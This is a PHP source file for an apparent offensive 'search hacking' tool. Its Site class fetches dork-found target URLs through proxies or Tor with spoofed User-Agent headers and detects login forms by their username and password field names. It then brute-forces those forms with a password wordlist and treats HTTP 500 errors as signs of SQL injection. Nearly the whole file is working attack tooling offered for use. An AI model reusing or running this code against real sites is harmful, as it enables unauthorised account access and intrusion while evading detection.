<?php

namespace Aszone\Component\SearchHacking\Lib\Site;

use GuzzleHttp\Client;
use GuzzleHttp\Exception;
use Aszone\Component\SearchHacking\Lib\FakeHeaders\FakeHeaders;
use Respect\Validation\Validator as v;
use Symfony\Component\DomCrawler\Crawler;

class Site{

	public $target;

	public $tor;

	public $proxy;

	public $bodyTarget;

	public $header;

	public function __construct($commandData,$targets)
	{
		//Check command of entered.
		$defaultEnterData=$this->defaultEnterData();
		$this->commandData=array_merge($defaultEnterData,$commandData);
		if($this->commandData['torl']){
			$this->commandData['tor']=$this->commandData['torl'];
		}
		$this->targets=$targets;
	}

	private function defaultEnterData()
	{
		$dataDefault['dork']=false;
		$dataDefault['pl']=false;
		$dataDefault['tor']=false;
		$dataDefault['tor']=false;
		$dataDefault['virginProxies']=false;
		$dataDefault['proxyOfSites']=false;

		return $dataDefault;
	}

	public function checkSuccess()
	{
		$this->header= new FakeHeaders();
		try{
			$client 		 = new Client();
			$this->bodyTarget= $client->get(
				$this->target,
				[
					"proxy"=> $this->proxy,
					'headers' => ['User-Agent' => $this->header->getUserAgent()],
					'timeout' => 30,
				])->getBody()->getContents();
			$actionsForm=$this->getActionForms();
			foreach($actionsForm as $action){
				return $this->isAdmin(false,$action);
			}

		}catch(\Exception $e){
			$this->bodyTarget=false;
		}
	}

	public function check(){
		$result = [];
		foreach ($this->targets as $searchEngenier) {
			foreach ($searchEngenier as $keyTarget => $target) {
				$this->target=urldecode(urldecode($target));
				echo $this->target;
				$resultCheck=$this->checkSuccess();
				if($resultCheck){
					echo " Success...";
					$result[] = $this->target;
				}
				echo "\n";
			}

		}

		return $result;
	}

	public function isAdmin($body=false,$action)
	{
		$html = new \simple_html_dom();
		if($body)
		{
			$html->load($body);
		}
		else
		{
			$html->load($this->bodyTarget);
		}
		$nodes = $html->find("form[action=".$action."] input");
		$isPassword=false;
		$isUsername=false;
		foreach($nodes as $node)
		{
			if($this->checkInputPassword($node))
			{
				$isPassword=true;
			}
			if($this->checkInputUsername($node))
			{
				$isUsername=true;
			}


			if($isPassword AND $isUsername)
			{
				return true;
			}
		}
		return false;
		/*
		$isUrl   	= v::url()->notEmpty()->validate($this->target);
		if($isUrl)
		{
			if(!$body)
			{
				$existInputPassword = $this->checkInputPassword($this->bodyTarget);
				$existInputUsername = $this->checkInputUsername($this->bodyTarget);
			}
			else
			{
				$existInputPassword = $this->checkInputPassword($body);
				$existInputUsername = $this->checkInputUsername($body);
			}

			if($existInputPassword AND $existInputUsername AND $existInputPassword['actionParentForm']==$existInputUsername['actionParentForm']){
				return true;
			}
		}*/
		return false;
	}

	public function formIsAdmin($actionForm)
	{

		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$isPassword=false;
		$isUsername=false;
		$nodes = $html->find("form[action=".$actionForm."] input");
		foreach($nodes as $node)
		{
			if($this->checkInputPassword($node))
			{
				$isPassword=true;

			}

			if($this->checkInputUsername($node))
			{

				$isUsername=true;

			}

			if($isPassword AND $isUsername)
			{
				return true;
			}
		}

		return false;
	}

	/*public function setProxySiteList()
	{
		$proxySiteList=new ProxySiteList();
		$proxy=$proxySiteList->getProxyOfSites();
		var_dump($proxy);
		exit();
	}*/

	public function getNameFieldUsername($actionForm)
	{
		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$nodes = $html->find("form[action=".$actionForm."] input");
		foreach($nodes as $node)
		{
			if($this->checkInputUsername($node))
			{
				return array($node->name=>"");
			}
		}

		return false;

	}
	public function getNameFieldPassword($actionForm)
	{

		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$nodes = $html->find("form[action=".$actionForm."] input");
		foreach($nodes as $node)
		{
			if($this->checkInputPassword($node))
			{
				return array($node->name=>"");
			}
		}

		return false;
		/*
		$resultNameField=false;
		$crawler 	= new Crawler($this->bodyTarget);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$resultNameField,&$actionForm) {
			if($node->attr('name') AND $this->sanitazeActionForm($node->parents()->filter('form')->attr('action'))== $actionForm)
			{
				$validNameField =  $this->verifyListNamesPassword($node->attr('type'));
				$field[$node->attr('name')]=$node->attr('value');
			}

			if(isset($validNameField) AND !empty($validNameField))
			{
				$resultNameField=$field;
			}
		});
		return $resultNameField;*/
	}

	public function getActionForm()
	{
		$result="";
		$crawler 	= new Crawler($this->bodyTarget);

		$action = $crawler->filter('form')->each(function (Crawler $node, $i) use(&$result)
		{
			if($this->isAdmin($node->parents('form')->html(),$node->attr('action')))
			{
				return $this->sanitazeActionForm($node->attr('action'));
			}
		});

	}

	private function singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields=[],$password,$username="")
	{
		$action=$this->sanitazeActionForm($action);
		$count404=0;
		echo ".";
		if(empty($username))
		{
			$username=$password;
		}
		$dataPost=array_merge($usernameField,$passwordField,$otherFields);
		$dataPost[key($usernameField)]=$username;
		$dataPost[key($passwordField)]=$password;

		$dataToPost=['body'=>$dataPost];
		$client 	= new Client(['defaults' => [
			'headers' => ['User-Agent' => $this->header->getUserAgent()],
			'proxy'   => $this->proxy,
			'timeout' => 30
		]
		]);

		$data=[];
		$data['sqlInjection']=false;
		if(strcasecmp($method,'post')==0){
			try{
				$data['body'] = $client->post($action,$dataToPost)->getBody()->getContents();
				$data['obs'] = "";
			}catch(\Exception $e){
				if($e->getCode()=="500")
				{
					$data['sqlInjection']=true;
					$data['obs']="is probably sql injection";
				}

				echo "\n".$e->getCode()." - page not Found;\n";

				if($e->getCode()=="404")
				{
					echo $e->getCode()." - page not Found;";
					$count404++;

					echo $count404;
					$data['obs'] ="problem with mount url action";
				}
				$data['body']="";

			}
		}
		return $data;
	}

	public function bruteForceAllInjection($action,$method,$usernameField,$passwordField,$otherFields=array(),$wordlist,$usernames=[])
	{

		//$actionFull=$this->sanitazeActionForm($action);

		$pageControl="";
		foreach($wordlist as $keyPassword=> $password)
		{

			if(empty($usernames))
			{
				$result=$this->singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields,$password);
			}
			else
			{
				foreach($usernames as $username)
				{
					$result=$this->singleBruteForce($action,$method,$usernameField,$passwordField,$otherFields,$password,$username);

				}
			}
			if($keyPassword==0)
			{
				$pageControl=$result['body'];
			}

			$resultIsAdmin=$this->isAdmin($result['body'],$action);

			if((isset($result['body']) AND $pageControl!=$result['body'] AND !$resultIsAdmin ) OR $result['sqlInjection'])
				//if(((isset($result['body']) AND $pageControl!=$result['body']) OR $keyPassword)AND(!$resultIsAdmin OR !$result['body']))
			{

				echo "\n...sussefull...\n";
				$resultData['username']=$password;
				$resultData['password']=$password;
				if($keyPassword){
					$resultData['obs']=$result['obs'];
				}
				return $resultData;
			}

			//sleep(1);
		}

		return;
	}

	public function getActionForms()
	{
		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$actions=[];

		$nodes = $html->find("form");
		foreach($nodes as $node)
		{
			$actions[] = $node->action;
		}

		return $actions;
	}




	private function sanitazeActionForm($action)
	{
		$targetIsUrl    = v::url()->notEmpty()->validate($action);
		if($targetIsUrl)
		{
			return $action;
		}

		$existeBar = substr($action, 0, 1);
		$explodeUrl=explode("/",$this->target);
		if($existeBar!="/")
		{
			array_pop($explodeUrl);
			$implodeUrl=implode("/",$explodeUrl);
			$resultAction= $implodeUrl."/".$action;
		}
		else
		{
			$resultAction=$explodeUrl[0]."/".$explodeUrl[1]."/".$explodeUrl[2].$action;
		}
		return $resultAction;

	}

	public function getMethodForm($actionForm)
	{
		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$nodes = $html->find("form[action=".$actionForm."]");
		foreach($nodes as $node)
		{
			return $node->method;
		}

		return false;
	}

	public function getOthersField($actionForm,$excludes)
	{
		$html = new \simple_html_dom();
		$html->load($this->bodyTarget);
		$nodes = $html->find("form[action=".$actionForm."] input");
		$otherFields=[];
		foreach($nodes as $key=> $node)
		{
			if(!empty($node->name) AND !array_key_exists(@$node->name, $excludes) )
			{
				$otherFields[$node->name]=$node->value;
			}
		}
		return $otherFields;
	}

	private function checkInputPassword($node)
	{
		if(strcasecmp($node->type,"password")==0)
		{
			return true;
		}
		return false;

		/*$checkPassword = false;
		$crawler 	= new Crawler($body);

		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkPassword) {
				if($node->attr('name'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword =  $this->verifyListNamesPassword($node->attr('name'));
				}
				if(!$node->attr('name') AND $node->attr('id'))
				{
					$actionForm=$node->parents()->filter('form')->attr('action');
					$validPassword = $this->verifyListNamesPassword($node->attr('id'));
				}
				if(isset($validPassword) AND !empty($validPassword))
				{
					$checkPassword['name']=$validPassword;
					$checkPassword['actionParentForm']=$actionForm;
				}
		});*/

		//return $checkPassword;

	}

	private function verifyListNamesPassword($name)
	{
		$isValid=preg_match("/(.?)pass|password|senha(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}

	private function checkInputUsername($node)
	{
		$isValid=preg_match("/(.?)user|username|login|cpf|email|mail|usuario(.?)/i",$node->name,$m);
		if($isValid)
		{
			return $isValid;
		}

		return false;
		/*$checkUsername=false;
		$crawler 	= new Crawler($body);
		$inputs = $crawler->filter('form')->filter('input')->each(function (Crawler $node, $i) use (&$checkUsername) {
			if($node->attr('name'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername =  $this->verifyListNamesUsername($node->attr('name'));
			}
			if(!$node->attr('name') AND $node->attr('id'))
			{
				$actionForm=$node->parents()->filter('form')->attr('action');
				$validUsername = $this->verifyListNamesUsername($node->attr('id'));
			}
			if(isset($validUsername) AND !empty($validUsername))
			{
				$checkUsername['name']=$validUsername;
				$checkUsername['actionParentForm']=$actionForm;
			}
		});
		return $checkUsername;
		*/
	}

	private function verifyListNamesUsername($name)
	{
		$isValid=preg_match("/(.?)user|username|login|cpf|email|mail|usuario(.?)/i",$name,$m);
		if($isValid)
		{
			return $isValid;
		}
		return false;
	}





	public function getBaseUrByUrl()
	{
		$validXmlrpc = preg_match("/^.+?[^\/:](?=[?\/]|$)/",$this->target,$m,PREG_OFFSET_CAPTURE);

		if ($validXmlrpc) {

			return $m[0][0];

		}
		return;
	}
}